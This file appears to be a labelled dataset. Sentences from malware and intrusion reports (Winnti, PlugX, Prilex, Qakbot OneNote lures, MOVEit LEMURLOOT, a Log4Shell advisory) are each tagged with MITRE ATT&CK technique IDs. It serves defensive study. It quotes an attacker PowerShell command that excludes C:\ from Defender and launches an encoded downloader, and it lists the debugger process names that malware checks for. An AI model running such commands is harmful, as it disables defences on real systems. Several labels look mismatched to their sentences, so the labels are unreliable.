The name depends on the specific sample and is encrypted with the algorithm used in it.,T1027
"Building the file name with PL shellcodeAmong all the loaders, we encountered three different shellcode payloads: Crosswalk Metasploit stager Cobalt Strike Beacon 2.3 Attack examples 2.3.1 An encrypted resume This malicious file is a RAR archive, electronic_resume.pdf.rar (025e053e329f7e5e930cc5aa8492a76e6bc61d5769aa614ec66088943bf77596), with two files: Figure 20.",T1027
"Configuration of Cobalt Strike BeaconThe archive was distributed on approximately June 1, 2020, from the IP address 66.42.48[.]186 and was available at hxxp://66.42.48[.]186:65500/electronic_resume.pdf.rar.",T1105
The same IP address was used as C2 server.,T1071.001
2.3.2 I can't breathe The attack is practically identical to the previous one: malware is distributed in a RAR archive video.rar (fc5c9c93781fbbac25d185ec8f920170503ec1eddfc623d2285a05d05d5552dc) and consists of two .exe files.,T1027
"Chat transcript The archive запись чата.7z (""chat transcript.7z"") (e0b675302efc8c94e94b400a67bc627889bfdebb4f4dffdd68fdbc61d4cd03ae) contains three identical executable files with names resembling ""запись чата-1.png____________________________________.exe"" (""chat transcript-1.png____________________________________.exe"") in attacks again targeting Russian-speaking users.",T1027
"Its configuration implies three ways to connect to the C2 server at 149.28.23[.]32: Transport protocol 3, port 8443 Transport protocol 2, port 80 Transport protocol 1, port 8080 Figure 25.",T1095
"The attack is based on the archive Resume.rar (4d3ad3ff281a144d9a0a8ae5680f13e201ce1a6ba70e53a74510f0e41ae6a9e6), which contains just one file: CV.chm. Running the file without security updates installed causes two windows to appear simultaneously: CHM help in HTML Help and a PDF document.",T1027
Reference to pass.js in HTML codeThe script uses a technique for running an arbitrary command in a CHM file via an ActiveX object.,T1055
"This unpacks an HTML help file to the folder C:\Users\Public for launching the next stage of the infection: the file resume.exe, which is also embedded inside the CHM file.","T1027, T1140, T1036.005"
Current processes are checked and the malware will not run if any of the following are active: ollydbg.exe|ProcessHacker.exe|Fiddler.exe|windbg.exe|tcpview.exe|idaq.exe|idaq64.exe|tcpdump.exe|Wireshark.exe.,T1057
Main function in resume.exeMyResume.pdf is unpacked from the CHM file.,"T1027, T1140"
"If the user opens it directly, a message warns that the document is password-protected.",T1204.002
"MyResume.pdf, as viewed in Adobe Acrobat ReaderCompared to the PL shellcode, the data structure is more complex and contains the following:",T1027
"ROR-13 hash of data starting from byte 0x24 (0x20, 4 bytes) Nonce for algorithm ChaCha20 (0x24, 12 bytes) ChaCha20-encrypted text (0x30): Name of PDF file (+0x0)",T1027
"Size of PDF file (+0x20) Size of auxiliary shellcode (+0x24) Size of main shellcode (+0x28) Constant 0xE839E900 (+0x2C) PDF file Auxiliary shellcode Main shellcode On first launch of resume.exe, the encrypted portion of the data is decrypted (the key is hard-coded in the executable) and three sections are extracted (PDF, auxiliary shellcode, and main shellcode).","T1027, T1140"
"resume.exe: actions on first launchThe payload runs in a new process %windir%\System32\spoolsv.exe, into which the main shellcode is injected: Cobalt Strike Beacon with C2 address 149.28.84[.]98.",T1055
"Injection occurs by creating a section via a ZwCreateSection call, getting access to it from the parent and child processes via ZwMapViewOfSection calls, copying shellcode to the section, and placing a jump to the shellcode at the entry point for spoolsv.exe.",T1106
"For persistence, resume.exe (under the name winness.exe) is copied to the folder %appdata%\Microsoft\AddIns\ and the main shellcode is re-encrypted and saved in the same location, with the name winness.config.","T1027, T1036.005"
"To ensure autostart, auxiliary shellcode writes the file svchost.bat, which transfers control to winness.exe, to the startup folder.",T1547.001
"For avoiding detection at this stage, the auxiliary shellcode is injected in a similar way into spoolsv.exe, independently loads the necessary functions, and writes to file in a separate thread.",T1055
"When winness.exe runs after a restart, the main shellcode is decrypted from winness.config and injected into spoolsv.exe in exactly the same way.","T1055, T1140"
"Copy of the official Battlestate Games siteWhen used as C2 servers, such domains give attackers the ability to mask malicious traffic as legitimate activity within the company.","T1090, T1071.001"
"They include Crosswalk and Metasploit injectors, the juicy-potato utility, and samples of FunnySwitch and ShadowPad. 5.",T1055
"The backdoor is written in .NET and can send system information as well as run arbitrary JScript code, with support for six different connection types, including the ability to accept incoming connections.",T1041
5.1 Unpacking The attack in question starts with the SFX archive x32.exe (2063fae36db936de23eb728bcf3f8a5572f83645786c2a0a5529c71d8447a9af).,T1027
"Contents of the archive x32.exeThe archive unpacks three files (1.vbs, n3.exe, and p3.exe) into the folder c:\programdata, after which the extracted VBS script runs both executables.","T1027, T1036.005"
The files n3.exe and p3.exe are identical and inject shellcode into the process explorer.exe.,T1055
"In one case, the proxy server 168.106.1[.]1 is specified there in addition: <?xml version=""1.0"" encoding=""utf-8""?> <Config Group=""aa"" Password=""test"" StartTime=""0"" EndTime=""24"" WeekDays=""0,1,2,3,4,5,6""> <HttpConnector url=""http://db311secsd.kasprsky[.]info/config/"" proxy=""http://168.106.1[.]1/"" interval=""30-60""/> </Config> <?xml version=""1.0"" encoding=""utf-8""?> <Config Group=""aa"" Password=""test"" StartTime=""0"" EndTime=""24"" WeekDays=""0,1,2,3,4,5,6""> <HttpConnector url=""http://db311secsd.kasprsky[.]info/config/"" interval=""30-60""/> </Config>",T1090
The job of the shellcode is to launch and execute a method from the .NET assembly located immediately after its code.,T1106
assemblyThe assembly is the library Funny.dll with obfuscation by ConfuserEx. 5.2 Funny.dll The backdoor starts by parsing the configuration.,T1055
"StartTime, EndTime, and WeekDays restrict the times and days when the backdoor may function The <Config> element may contain an arbitrary number of elements describing various types of connectors: TcpConnector and TcpBindConnector are classes responsible for connecting over TCP as client and server.",T1095
"TcpConnector also has the parameter interval, which indicates how long to wait before trying to reconnect.",T1071.001
HttpConnector and HttpBindConnector are HTTP client with support for proxy and HTTP server.,"T1090, T1071.001"
"Supported client parameters: url – address to connect to, interval – same as at TcpConnector, proxy and cred – proxy server address and credentials.",T1090
The standard classes HttpWebRequest and HttpListener from .NET,T1106
Framework are used for client and server implementations.,T1106
"Both HTTP and HTTPS are supported: if no SSL certificate is configured for the port on which the server is running, it will be launched with CN = Environment.",T1071.001
"The client, in turn, ignores certificate validation.",T1106
RPCConnector and RPCBindConnector are classes that allow setting up a connection via a Named Pipe.,T1106
"They take a single parameter, name, which is the name of the connection.",T1106
TcpBindConnector and HttpBindConnector support simultaneous connections for multiple clients.,T1106
"5.2.1 Transport protocols TCP TCP supports three types of messages: PingMessage (0x1), PongMessage (0x2), and DataMessage (0x3).",T1095
The first two monitor the connection and are relevant only at the TcpConnector/TcpBindConnector level.,T1106
"Messages consist of a signature (4 bytes), encrypted header (16 bytes), and optional data.",T1027
It is encrypted with AES-256-CBC; the key and IV are taken from the MD5 of the key string.,T1573.001
"Standard encryption in FunnySwitch HTTP with long polling There are three types of requests: GET ""connect"", GET ""pull"", and POST ""push"".",T1071.001
"To start transferring data, the client must connect by sending a GET request to a URL from the configuration and provide a special cookie value.",T1071.001
"The value is an encrypted Base64 string containing the session GUID and operation name (""connect"").",T1027
"The string is encrypted in the standard way with the key ""http"".",T1573.001
The client then constantly sends GET requests with pull operations.,T1071.001
"Client–server messages are periodically sent as an array as well, for which a POST request with push operation is used.",T1071.001
"FunnySwitch connect and pull requestsThe special class MsgPack class, which implements a custom serialization protocol, unpacks the array and other primitive types.",T1095
"RPC (Pipe) Similar to TCP, except for the absence of connection monitoring.",T1095
5.2.2 Network-level protocol Figure 43.,T1095
"Function for processing incoming network-level communicationsAll messages at this level are encrypted in the backdoor's standard way, with the key string ""commonkey"".",T1573.001
"The backdoor collects the following system information: Values of the registry keys ProductName and CSDVersion from HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion Whether the OS is 32-bit or 64-bit List of IP addresses Computer name Username and workgroup Name of running module PID MAC addresses of network adapters Value of the Group attribute in the XML configuration 5.2.3 Application-level protocol At the application level, data is encrypted in the standard way using the value of the Password attribute from the configuration.","T1573.001, T1057, T1071.001, T1082, T1033, T1016"
Data is compressed with GZip prior to encryption.,T1027
"After decryption and decompression, the payload is an array (packed MsgPack) consisting of one or two elements: a string with the name of a command and optional array of bytes (data for the command).",T1140
"Implementation was separated out into a JSCore .NET assembly, which is dynamically loaded from a Base64 constant defined in the main assembly.",T1027
query Collects the configuration of active connector instances other than the RPCConnector and RPCBindConnector classes.,T1016
"The code also contains several unused classes: an implementation of the KCP protocol, limited-size queue SizeQueue, and string serializer StreamString. Figure 46.",T1095
Several things point at common authorship: Use of multiple transport protocols Support for specifying a proxy server Identical configuration restrictions on time of day and days of the week Implementation of the KCP protocol Implemented (and disabled by default) logging of debug messages and errors Figure 47.,"T1090, T1095"
"Bait file wedding.docxThe archive contents are unpacked to the folder c:\programdata, from where (besides the bait file being opened) the payload log.exe is launched.","T1027, T1036.005"
"Both the executable file and the DLL library are obfuscated with VMProtect, but we also found identical unprotected versions (as shown in the following screenshots).",T1027
It dynamically loads the library log.dll.,T1055
"In our case, the code run afterwards had been obfuscated with a new approach: all functions are split into separate instructions that shuffle between each other.",T1027
"Structure of obfuscated codeIn addition, to obfuscate the control flow in the code, conditional jumps that never run are included as well: cmp esp, 3181h jb loc_1000BCA9 The obfuscated code is the loader for the subsequent shellcode, which is encrypted in the file log.dll.dat.",T1027
"After decryption, the file is deleted and the shellcode is re-encrypted, saved in the registry, and run.","T1027, T1140, T1112, T1070.004"
The payload is ShadowPad shellcode that has been obfuscated with the same rel_jmp and fake-jb techniques.,T1027
"Its core is typical of PlugX, being an SFX archive (ccdb8e0162796efe19128c0bac78478fd1ff2dc3382aed0c19b0f4bd99a31efc) that contains the library mapistub.dll, which loads as a legitimate executable.","T1027, T1055"
"Google Docs is used to store the payload: the library sends a request to export a certain document in .txt format, decodes it into shellcode with Base64, and runs it. Figure 56.",T1140
Loading and running shellcode in mapistub.dllThe shellcode has been obfuscated with junk instructions and inverted conditional jumps (combinations of jle/jg and the like).,T1027
"Its job is to decrypt and run the next stage, which is responsible for reflective loading of the main PlugX component and passing the structure with the configuration to it.",T1140
"It, too, is an SFX archive (94ea23e7f53cb9111dd61fe1a1cbb79b8bbabd2d37ed6bfa67ba2a437cfd5e92) but with different files inside.",T1027
"Contents of the SFX archiveWhen unpacked, the archive runs the script 1.vbs, which in turn passes control to a.bat. Figure 60.","T1027, T1059.003"
Running shellcode in image.jpgThe purpose of image.jpg is to run the same PlugX shellcode with the help of CreateThread.,T1106
"The domain upgradsource[.]com is mentioned in a Unit42 report on a group of similar samples named ""Paranoid PlugX."" They received this name due to the presence of a script for wiping traces of malware from the system.",T1070.004
"Among other reasons, the structure of the .NET Wrapper module in image.jpg, and much of the cleanup script a.bat, is nearly identical.",T1059.003
"One distinguishing trait of the group's backdoors is support for multiple transport protocols for connecting to C2 servers, which complicates efforts to detect malicious traffic.",T1095
"Malicious files of varying resemblance are used to install the payload, from primitive RAR and SFX-RAR files to reuse of malware from other groups and multistage threats with vulnerability exploits and non-trivial shellcode loaders.",T1027
Spearphishing Attachment Winnti sends phishing messages with malicious attachments T1566.002,T1566.001
"Spearphishing Link Winnti sends phishing messages with malicious links Execution T1059.003 Command and Scripting Interpreter: Windows Command Shell Winnti uses cmd.exe and .bat files to run commands T1059.005 Command and Scripting Interpreter: Visual Basic Winnti uses VBS files to pass control to subsequent malware stages T1059.007 Command and Scripting Interpreter: JavaScript/JScript Winnti uses malicious JScript code in intermediate stages and for the payload T1203 Exploitation for Client Execution Winnti exploits RCE in a CHM file by means of an ActiveX object T1106 Native API Winnti uses various WinAPI functions to run malicious shellcode in the current process or to inject it into another process T1204.002 User Execution: Malicious File Winnti tries to make users run malicious .lnk, .chm, and .exe files Persistence T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Winnti persists by means of a registry run key or a startup folder T1543.003 Create or Modify System Process:","T1547.001, T1106, T1059.003, T1204.002"
"Windows Service Winnti persists on infected machines by creating new services T1053.005 Scheduled Task/Job: Scheduled Task Winnti creates a task with schtasks for persistence Defense evasion T1140 Deobfuscate/Decode Files or Information To store shellcode with the payload, Winnti uses a custom PL format with encryption T1574.002 Hijack Execution Flow: DLL Side-Loading Winnti uses legitimate utilities to load DLLs from ShadowPad and PlugX T1562.004 Impair Defenses: Disable or Modify System Firewall FunnySwitch adds allow rules to Windows Firewall for C2 connections T1070 Indicator Removal on Host Paranoid PlugX deletes artifacts created during infection from the file system and registry T1202 Indirect Command Execution Winnti uses intermediate VBS scripts to run .bat","T1574.002, T1140, T1543.003, T1053.005"
"files T1027.002 Obfuscated Files or Information: Software Packing Winnti can use VMProtect or custom packers for its malware T1055.002 Process Injection: Portable Executable Injection Winnti injects shellcode into the processes explorer.exe, winlogon.exe, wmplayer.exe, svchost.exe, and spoolsv.exe T1218.001 Signed Binary Proxy Execution: Compiled HTML File Winnti uses CHM files containing malicious code T1218.004 Signed Binary Proxy Execution: InstallUtil Paranoid PlugX can use InstallUtil to run a malicious .NET assembly T1553.002 Subvert Trust Controls: Code Signing Winnti uses stolen certificates to sign its malware Discovery T1082 System Information Discovery Winnti backdoors collect information about the computer name and OS version and whether it is 32-bit or 64-bit T1016 System Network Configuration Discovery Winnti backdoors collect information about the IP and MAC addresses of the infected machine T1033 System Owner/User Discovery Winnti backdoors collect information about the name of the current user Collection T1119 Automated Collection Winnti backdoors automatically collect information about the infected machine Command and Control T1071.001 Application Layer Protocol: Web Protocols Winnti backdoors can use HTTP/HTTPS for C2 connections T1132.001 Data Encoding: Standard Encoding Winnti uses GZip for compressing FunnySwitch data T1001.003 Data Obfuscation:","T1055, T1082, T1071.001, T1027, T1033, T1016"
Symmetric Cryptography Winnti uses AES for encrypting traffic in its backdoors T1008 Fallback Channels The Winnti configuration supports indicating multiple C2 servers of various types T1095 Non-Application Layer,T1573.001
Protocol Winnti backdoors can use TCP and UDP for C2 connections T1090.001 Proxy: Internal Proxy FunnySwitch can establish C2 connections via a peer-to-peer network of infected hosts T1090.002 Proxy: External Proxy Winnti backdoors support C2 connections via an external HTTP/SOCKS proxy T1102.001 Web Service: Dead Drop Resolver Winnti uses Google Docs for updating the C2 address in PlugX,"T1095, T1090"
Technical Analysis Initial Infection Vectors [TA0001] Forensic investigations identified that the actor established initial access by compromising the victim’s web server [T1190].,T1190
"On the webserver, software was installed to maintain the presence and storage of tools [T1105] that would be used to gather information about the victim’s network [T1083] and lateral movement/execution of files [T1570] [T1569.002].",T1570
We will highlight a few in each category.,T1003.001
"Besides the use of Mimikatz to dump credentials, the adversaries used two tools for privilege escalations [T1068].",T1003.001
PlugX makes use of the technique “DLL Sideloading” [T1574.002].,T1574.002
"When the executable is run, the DLL next to it is loaded.",T1574.002
The DLL loads the PlugX config and injects it into a process.,T1055
"After the basic forensically sound steps, we ran the malfind plugin to detect possible injected code in a process.",T1055
For example: hxxp://sery.brushupdata.com/B4BBDCC029E119719F065622 hxxp://sery.brushupdata.com/07FDB1B97D22EE6AF2482B1B hxxp://sery.brushupdata.com/273CDC0B9C6218BC1187556D Other PlugX samples we observed injected themselves into Windows Media Player and started a connection with the following two domains: center.asmlbigip.com sec.asmlbigip.com,T1055
Hello Winnti Another mechanism observed was to start a program as a service,T1543.003
The file the adversary was using seemed to be a backdoor that was using the DLL file format (2458562ca2f6fabddae8385cb817c172).,T1543.003
The DLL is used to create a malicious service and its name is “service.dll”.,T1543.003
"The name of the created service, “SysmainUpdate”, is usurping the name of the legitimate service “SysMain” which is related to the legitimate DLL sysmain.dll and also to the Superfetch service.",T1543.003
"The dll is run using the command “rundll32.exe SuperFrtch.dll, #1”.",T1218.011
The export function has the name “WwanSvcMain”.,T1569.002
The model uses the persistence technique utilizing svchost.exe with service.dll to install a rogue service.,T1569.002
The DLL embeds several obfuscated strings decoded when running.,"T1027, T1140"
"Once the fingerprinting has been done, the malware will install the malicious service using the API RegisterServiceHandlerA then SetServiceStatus, and finally CreateEventA.",T1106
A description of the technique can be found here.,T1140
The malware also decrypts and injects the payload in memory.,"T1055, T1140"
The following screenshot shows the decryption routine.,T1140
"Figure 4 Decryption routine When we analyzed this unique routine, we discovered similarities and the mention of it in a publication that can be read here.",T1140
[data from location] 0% OK Another indicator of discovering Winnti malware was the following execution path we discovered in the command line dump of the memory:,T1059.003
cmd /c,T1059.003
"klcsngtgui.exe 1560413F7E <abbreviation-victim>.dat What we observed here was the use of a valid executable, the AES 256 decryption key of the payload (.dat file).",T1140
"Unfortunately, the adversary had removed the payload file from the system.",T1027
The malware was injected into a SVCHOST process where a driver location pointed to the config file.,T1055
"We observed in the process dump the exfiltration of data on the system, such as OS, Processor (architecture), Domain, Username, etc.","T1033, T1082"
Chrome/57.0.2987.133 Safari/537.36 Other Persistence Activities WMI activity [T1546.003] was also observed to execute commands on the systems.,"T1047, T1053.005"
"From a persistence point of view, scheduled tasks [T1053.005] and the use of valid accounts [T1078] acquired through the use of Mimikatz, or creating LSASS dumps, were observed being employed during the length of the campaign.","T1003.001, T1078, T1053.005"
"When running the file from the command line, the following output was observed: Figure 5 PsExec output The error notification and the ‘Impacket’ keyword tipped us off and, after digging around, we found more.",T1059.003
"In some cases, batch (.bat) scripts were created to gather information from certain network shares/folders and use the ‘rar’ tool to compress them to a certain size [T1020]",T1059.003
Example of content in a batch script: C:\Windows\web\rar.exe a -[redacted] -r -v50000,T1059.003
"[Target-directory] On other occasions, manual variants of the above command were discovered after using the custom backdoor as described earlier.",T1005
"When the data was gathered on a local system using the backdoor, the files were exfiltrated over the backdoor and the rar files were deleted [T1070.004].","T1041, T1005, T1070.004"
"Where external facing assets were used, like a web server, the data was stored in a location in the Internet Information Services (IIS) web server and exfiltrated over HTTP using GET requests towards the exact file paths [T1041] [T1567] [T1071].","T1041, T1071.001"
"After that, using Mimikatz and dumping lsass, they were looking to get valid accounts.","T1003.001, T1078"
The Winnti loader ‘Ins64.exe’ uses the value ‘E370AA8DA0’ to decrypt the payload from the .dat file using the AES-256-CTR decryption algorithm and starts to execute.,T1140
"After executing this command and analyzing the memory, we observed a process injection in one of the svchost processes whereby one particular file was loaded from the following path: C:\programdata\microsoft\windows\caches\ieupdate.dll Figure 11",T1055
Memory capture The malware started to open up both UDP and TCP ports to connect with a C2 server.,T1095
UDP Port 20502 TCP Port 20501 Figure 12 Network connections to C2 Capturing the traffic from the malware we observed the following as an example: Figure 13 Winnti HTTP traffic to C2 The packet data was customized and sent through a POST request with several headers towards the C2.,T1071.001
The cookie value consists of four Dword hex values that contain information about the customized packet size using a XOR value.,T1573.001
MITRE ATT&CK Techniques Technique ID Technique Title Context Campaign T1190 Exploit Public-facing application Adversary exploited a web-facing server with application T1105 Ingress Tool transfer Tools were transferred to a compromised web-facing server T1083 File & Directory Discovery Adversary browsed several locations to search for the data they were after.,"T1190, T1105, T1083"
T1570 Lateral Tool Transfer Adversary transferred tools/backdoors to maintain persistence T1569.002 System Services: Service Execution Adversary installed custom backdoor as a service T1068,T1543.003
The exploitation of Privilege Escalation Adversary used Rotten/Bad Potato to elevate user rights by abusing API calls in the Operating System.,"T1106, T1068"
"T1543.003 Create or Modify System Process: Windows Service Adversary launched backdoor and some tools as a Windows Service including adding of registry keys T1546.003 Event-Triggered Execution: WMI Event Subscription WMI was used for running commands on remote systems T1053.005 Scheduled task Adversary ran scheduled tasks for persistence of certain malware samples T1078 Valid accounts Using Mimikatz and dumping of lsass, the adversary gained credentials in the network T1020 Automated exfiltration The PlugX malware exfiltrated data towards a C2 and received commands to gather more information about the victim’s compromised host. T1030 Data transfer size limits Adversary limited the size of rar files for exfiltration T1070.004 Indicator removal on host Where in the beginning of the campaign the adversary was sloppy, during the last months of activity they became more careful and started to remove evidence T1041 Exfiltration over C2 channel Adversary used several C2 domains to interact with compromised hosts.","T1047, T1078, T1112, T1041, T1003.001, T1027, T1543.003, T1053.005"
"After obtaining initial network access, the attacker would run a network recognition process to find the IP address of each of the ATMs.",T1016
"With that information in hand, the attackers would launch a lateral movement phase, using default Windows credentials and then installing custom-crafted malware in the desired systems.",T1078
"In fact, the PIN is encrypted in the device upon entry using a variety of encryption schemes and symmetric keys.",T1573.001
The fake technician may visit the target in person or request the victims to install AnyDesk and provide remote access for the “technician” to install the malware.,T1219
Hook code added into CloseHandle process All captured information from the transaction is saved to an encrypted file placed in a directory previously set by the malware configuration.,T1074.001
"Those files will later be sent to the malware C2 server, allowing the cybercriminals to make transactions through a fraudulent PoS device registered in the name of a fake company.",T1041
"Reboot, SendKeys, ShowForm, Inject, UnInject, HideForm, Recursos, GetZip, SetStartup, PausaProcesso, LiberaProcesso, Debug, SendSnapShot, GetStartup, CapRegion, CapFerro, KillProcess, Shell, Process, GetModules, GetConfig, StartSendScreen, StopSendScreen, ReLogin, StartScan, GetKey, SetConfig, RefreshScreen, Download, TakeRegions, Enviar Arquivo, ScanProcessStart, ScanProcessStop, StartRegiao, StopRegiao, StartDownload, StopDownload.","T1105, T1113"
Command Description Download Download a file from the remote server Shell Execute a specified command via CMD GetConfig Get the configuration file KillProcess Terminate a process SetStartup Add the process to a startup registry key StartSendScreen Start screen capture StopSendScreen Stop screen capture Uploader Module This module is responsible for checking the directory specified in the CABPATH parameter in the config file and sending all cab files generated from the stolen transactions to the server; the files are sent through an HTTP POST request.,"T1105, T1071.001, T1041, T1547.001, T1059.003, T1113"
"This uploader allows the operator to set the endpoint for the collected information as indicated in the configuration file; judging from the samples analyzed, it is possible to see a different infrastructure involved in the process.",T1041
"Captured data stored in the uploader C2 Malware-as-a-service In 2019, a website claiming to be affiliated with Prilex started offering what it said was a malware package created by the group.",T1041
"title: The Rising Trend of OneNote Documents for Malware delivery url: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rising-trend-of-onenote-documents-for-malware-delivery/ Authored By Anandeshwar Unnikrishnan,Sakshi Jaiswal,Anuradha M McAfee Labs has recently observed a new Malware campaign which used malicious OneNote documents to entice users to click on an embedded file to download and execute the Qakbot trojan.",T1204.002
Based on the telemetry from our endpoints we have identified the following threat families deployed through OneNote documents: Iceid Qakbot RedLine AsyncRat Remcos AgentTesla QuasarRAT XWORM Netwire Formbook Doubleback Overview Of Malicious OneNote Documents A holistic view of the phishing campaigns that weaponize OneNote document is shown in Figure 2 below.,T1566.001
The malicious document is delivered in either zip files or ISO images to the target through phishing emails.,T1566.001
We have observed that most of the malicious documents either have Windows batch script that invokes Powershell for dropping the malware on the system or Visual Basic scripts that does the same.,T1059.003
Size of the data unused Size: 4 bytes reserved Size: 8 bytes FileData Size: Variable guidFooter Size: 16 bytes Value: {71FBA722-0F79-4A0B-BB13-899256426B24},T1027
The FileData member of the FileDataStoreObject is the key member that holds the embedded data in the OneNote document.,T1027
"Figure 7 Embedded data in Data object For more information on the OneNote specification, go to reference section Artifact Extraction",T1027
"Dump the bytes read on to disk Repeat above steps for every FileDataStoreObject present in the binary Embedded Executable Objects In OneNote Execution Of Embedded Entities Looking at the runtime characteristics of OneNote Desktop application we have observed that when an embedded file gets executed by the user, it is stored temporarily in the OneNote directory in the User’s Temp location.",T1027
"Figure 8 OneNote directory in Temp By analyzing numerous malicious documents, we have been able to create a “test” OneNote document that executes a batch file that contains the “whoami” command.","T1033, T1059.003"
The image in Figure 9 show the batch file being created in the user’s temp location.,T1059.003
"In campaign 1, the malware author used phishing emails to deliver malicious OneNote document either as attachment or a URL link to zip file containing the OneNote document.",T1566.001
The OneNote contained aHTA file that once executed would make use of the curl utility to download Qakbot and then execute it.,T1105
Infection Flow: Figure 10 Infection Chain Spam email delivers a malicious OneNote file as an attachment or a link to a ZIP file that contains a OneNote file.,T1027
OneNote file contains an embedded HTA attachment and a fake message to lure users to execute the HTA file The HTA file uses curl utility to download the Qakbot payload and is executed by rundll32.exe.,"T1218.011, T1027, T1105, T1204.002"
Technical Analysis:,T1027
The OneNote file with the embedded HTA file is shown in the Figure 11.,T1027
"Once this OneNote file is opened, it prompts the user with a fake message to double-click on open to view the attachment.",T1204.002
"Figure 11 OneNote Template Upon clicking the Open button, it drops the HTA file with the name Open.hta to the %temp%",T1204.002
Folder and executes it using mshta.exe. Figure 12 Drop file in Temp location,T1027
The HTA file contains obfuscated script as shown below: Figure 13 Obfuscated HTA script The HTA file is loaded by MSHTA and creates a registry key in HKEY_CURRENT_USER\SOFTWARE\ with obfuscated content as shown below: Figure 14 Registry key creation,"T1027, T1112"
The obfuscated registry is then read by MSHTA and the obfuscated code is de-obfuscated.,"T1027, T1140"
"Finally, MSHTA calls this function by passing the malicious URL as a parameter and then deletes the registry key as shown in Block 2.",T1112
De-obfuscated content from the HTA file is shown below: Figure 15 Deobfuscated HTA content Curl is used to download the malicious DLL file in C:\ProgramData Folder with .png extension.,"T1105, T1140"
The script will then execute the downloaded file with Rundll32.exe with the export function Wind.,"T1105, T1218.011"
The message above the ‘Open’ button instructs the user to “double click” in order to receive the attachment.,T1204.002
Figure 19 Malicious content A closer look at the document reveals the graphical elements are all images placed in a layered style by the malicious actor.,T1027
"By moving the icons aside, we can see the malicious batch file which when executed downloads the payload from the Internet and executes on the target system.","T1105, T1059.003"
"Figure 20 Hidden Malicious dropper script Execution Of Payload Dropper Upon execution of the batch file, Powershell will be invoked and it fetch the Qakbot payload from Internet and execute it on the target system.","T1105, T1059.003"
The Figure 21 Show the process tree after the execution of the script and you can see that powershell.exe was launched by cmd.exe and the parent of cmd.exe is onenote.exe.,T1059.003
Figure 22 Cmd.exe properties,T1140
The base64 decoded batch file is shown in Figure 23.,"T1059.003, T1140"
This will use powershell to download the payload and then execute it with rundll32.exe Figure 23 Base64 Decoded instructions in dropper IOCS Type Value Product Detected Campain 2 – Zip File 000fb3799a741d80156c512c792ce09b9c4fbd8db108d63f3fdb0194c122e2a1 Total Protection and LiveSafe VBS/Qakbot.a Campain 2 – OneNote File 2bbfc13c80c7c6e77478ec38d499447288adc78a2e4b3f8da6223db9e3ac2d75 Total Protection and LiveSafe One/Downloader.a Campain 2 – Powershell File b4dd3e93356329c076c0d2cd5ac30a806daf46006bdb81199355952e9d949424 Total Protection and LiveSafe PS/Agent.gs Campain 2 – OneNoteFile a870d31caea7f6925f41b581b98c35b162738034d5d86c0c27c5a8d78404e860 Total Protection and LiveSafe VBS/Qakbot.a Domains: starcomputadoras.com Conclusion: Malware authors are getting more sophisticated when it comes to hiding their payloads.,"T1105, T1140, T1218.011"
"Following exploitation of the vulnerability, the threat actors are deploying a newly discovered LEMURLOOT web shell with filenames that masquerade as human.aspx, which is a legitimate component of the MOVEit Transfer software.",T1036.005
"Mandiant has observed several POST requests made to the legitimate guestaccess.aspx file before interaction with the LEMURLOOT webshell, indicating SQLi attacks were directed towards that file.",T1071.001
"LEMURLOOT provides functionality tailored to execute on a system running MOVEit Transfer software, including the ability to generate commands to enumerate files and folders, retrieve configuration information, and create or delete a user with a hard-coded name.",T1083
Mandiant is aware of multiple cases where large volumes of files have been stolen from victims' MOVEit transfer systems.,T1005
"Many of the hosts used to support these second-stage operations hosted RDP services with certificates generated between May 19 and 22, which is suggestive of when this infrastructure may have been staged.",T1021.001
"The malware authenticates incoming connections via a hard-coded password and can run commands that will download files from the MOVEit Transfer system, extract its Azure system settings, retrieve detailed record information, create and insert a particular user, or delete this same user.",T1105
"It then performs SQL queries to retrieve files, file size, folders, file owners, and institution name data.",T1083
"The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies.","T1090, T1078"
"Threat Actor Activity In February 2022, the threat actors exploited Log4Shell [T1190] for initial access [TA0001] to the organization’s unpatched VMware Horizon server.",T1190
The actors’ exploit payload ran the following PowerShell command [T1059.001] that added an exclusion rule to,T1562.001
Windows Defender,T1562.001
"[T1562.001]: powershell try{Add-MpPreference -ExclusionPath 'C:\'; Write-Host 'added-exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc ""$BASE64 encoded payload to download next stage and execute it"" The exclusion rule allowlisted the entire c:\drive, enabling threat actors to download tools to the c:\drive without virus scans.","T1027, T1562.001, T1105"
The exploit payload then downloaded mdeploy.text from 182.54.217[.]2/mdepoy.txt to C:\users\public\mde.ps1,T1105
"When executed, mde.ps1 downloaded file.zip from 182.54.217[.]2 and removed mde.ps1 from the disk [T1070.004]. file.zip contained XMRig cryptocurrency mining software and associated configuration files.",T1070.004
The exploit payload created a Scheduled Task,T1053.005
The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task.,T1053.005
"After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount","T1021.001, T1078"
[T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.,T1078
The actors downloaded the following tools: PsExec – a Microsoft signed tool for system administrators.,"T1105, T1003.001"
Mimikatz – a credential theft tool.,"T1090, T1003.001"
"Ngrok – a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok[.]io.",T1090
Ngrok is known to be used for malicious purposes.[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account,T1003.001
"Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.",T1021.001
"Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.",T1562.001
"The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok[.]com and korgn.su.lennut[.]com (the prior domain in reverse).","T1090, T1021.001, T1071.001"
"Additionally, the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process [T1003.001] with task manager but this was stopped by additional anti-virus the FCEB organization had installed. MITRE ATT&CK TACTICS AND TECHNIQUES See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations.",T1003.001
Table 1: Cyber Threat Actors ATT&CK Techniques for Enterprise Initial Access Technique Title ID Use Recommendations Exploit Public-Facing Application T1190 The actors exploited Log4Shell for initial access to the organization’s VMware Horizon server.,T1190
